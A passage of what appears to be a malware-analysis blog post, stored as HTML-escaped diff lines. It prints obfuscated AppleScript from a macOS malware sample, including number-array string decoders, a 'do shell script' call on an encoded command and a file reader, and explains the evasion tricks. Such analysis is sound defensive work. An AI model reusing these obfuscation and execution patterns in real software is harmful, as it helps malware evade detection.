+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;iqbrjbegq&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;yhkylofpi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lqgiwmzczxv&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; ((&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;iqbrjbegq&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;yhkylofpi&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;zkhoxipck&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lqgiwmzczxv&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lqgiwmzczxv&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;iqbrjbegq&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dofhtoiddo&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;kutavyrrjoki&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;kutavyrrjoki&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;character&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lqgiwmzczxv&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;oyuuyqoiuxc&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;oyuuyqoiuxc&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lqgiwmzczxv&lt;/span&gt;) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;mod&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;kutavyrrjoki&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;czxucxewqe&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lewqomem&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;lrizipvij&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;try&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;zyasodofd&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;quoted form&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;POSIX&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lrizipvij&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020&#34;&gt;do shell script&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;cdftjcxbo&lt;/span&gt;({&lt;span style=&#34;color:#40a070&#34;&gt;305&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;186&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;278&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;283&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;321&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;117&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;240&lt;/span&gt;}, {&lt;span style=&#34;color:#40a070&#34;&gt;196&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;178&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;178&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;207&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;55&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;208&lt;/span&gt;})) &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;zyasodofd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;try&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;lewqomem&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;imxovxyrmjr&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;uhnbyobcd&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;43&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;try&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;44&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;abuscytik&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;POSIX&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;uhnbyobcd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;45&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pyrykioedj&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;read&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;abuscytik&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;46&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pyrykioedj&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;47&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;try&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;48&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;49&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;imxovxyrmjr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The key magic is the three functions defined at the top: all strings used in this malware are hidden as arrays of numbers, which correspond to
+ASCII character IDs. The three functions &lt;code&gt;cdftjcxbo&lt;/code&gt;, &lt;code&gt;cmbnxmjiwwr&lt;/code&gt;, and &lt;code&gt;czxucxewqe&lt;/code&gt; return strings from two arrays of numbers by either
+adding, subtracting, or adding with a constant the Nth item in each list. There are also some dummy variables in there that appear to exist
+solely to make behavioural analysis harder; they&amp;rsquo;re calculated and updated but never read or returned. Let&amp;rsquo;s look at one of these in detail:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-AppleScript&#34; data-lang=&#34;AppleScript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;, &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;mod&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;character&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;id&lt;/span&gt; ((&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function builds a string by &lt;em&gt;adding&lt;/em&gt; the contents of two arrays. If we were to transpose this to Python, it looks something like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;string_by_adding&lt;/span&gt;(a: &lt;span style=&#34;color:#007020&#34;&gt;list&lt;/span&gt;[&lt;span style=&#34;color:#007020&#34;&gt;int&lt;/span&gt;], b: &lt;span style=&#34;color:#007020&#34;&gt;list&lt;/span&gt;[&lt;span style=&#34;color:#007020&#34;&gt;int&lt;/span&gt;]) &lt;span style=&#34;color:#666&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;str&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;    out &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;    dummy_var &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#007020&#34;&gt;len&lt;/span&gt;(a)):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;        dummy_var &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; (dummy_var &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; b[i]) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;        out &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;chr&lt;/span&gt;(a[i] &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; b[i])
